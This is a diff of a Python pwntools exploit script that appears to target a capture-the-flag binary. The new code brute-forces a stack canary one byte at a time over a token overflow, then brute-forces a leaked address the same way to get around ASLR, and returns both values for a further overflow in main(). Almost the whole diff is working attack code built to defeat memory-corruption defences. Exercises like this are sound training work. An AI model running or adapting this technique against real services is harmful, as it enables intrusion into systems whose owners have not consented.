@@ -46,40 +46,71 @@ def buf_canary():
     r.sendline('3')
     print(r.recv())
 
-def hack_canary_2():
+def hack_canary_ASLR():
     canary = ''
     canary_offset = 0xb8
-    guess = 0x0
+    guess = 0
 
     buf = ''
     buf += 'A' * canary_offset
 
+    r.sendlineafter('>', '2')
+    r.sendlineafter('token: ', buf)
+
+    print('finished regiseter a token! ')
     while len(canary) < 8:
         while guess <= 0xff:
 
-            r.send('1')
+            r.sendlineafter('>', '1')
             r.sendthen('Token: ', buf + chr(guess))
 
-            check = r.recv()
-            print('try canary --> ', hex(guess), check)
+            check = r.recvline()
+            # print('try canary --> ', hex(guess), check)
             if 'Invalid' not in check:
                 print('Correct canary byte --> ', format(guess, '02x'))
                 canary += chr(guess)
                 buf += chr(guess)
                 guess = 0
+
+                # logout
+                r.sendlineafter('>', '3')
                 break
 
-            r.send('2')
-            r.sendthen('token: ', buf + chr(guess))
-            print('Done --> ', r.recv())
             guess += 1
-            #pause()
 
-    print('Canary --> ', hexdump(canary))
+
+    aslr = ''
+    guess = 0
+
+    print('buf --> ', buf)
+    print('canary --> ', hex(u64(canary)))
+    pause()
+    while len(aslr) < 8:
+        while guess <= 0xff:
+
+            r.sendlineafter('>', '1')
+            r.sendthen('Token: ', buf + chr(guess))
+
+            check = r.recvline()
+            # print('try canary --> ', hex(guess), check)
+            if 'Invalid' not in check:
+                print('Correct aslr byte --> ', format(guess, '02x'))
+                aslr += chr(guess)
+                buf += chr(guess)
+                guess = 0
+
+                # logout
+                r.sendlineafter('>', '3')
+                break
+
+            guess += 1
+
+    print('ASLR --> ', hex(u64(aslr)))
+    return u64(canary), u64(aslr)
 
 def main():
-    # brute force finding canary
-    hack_canary_2()
+    # brute force finding canary, and some ASLR-shit
+    hack_canary_ASLR()
     # vote for writing more buffer
     for token_cnt in xrange(0, 25):
         r.sendlineafter('>', '2')
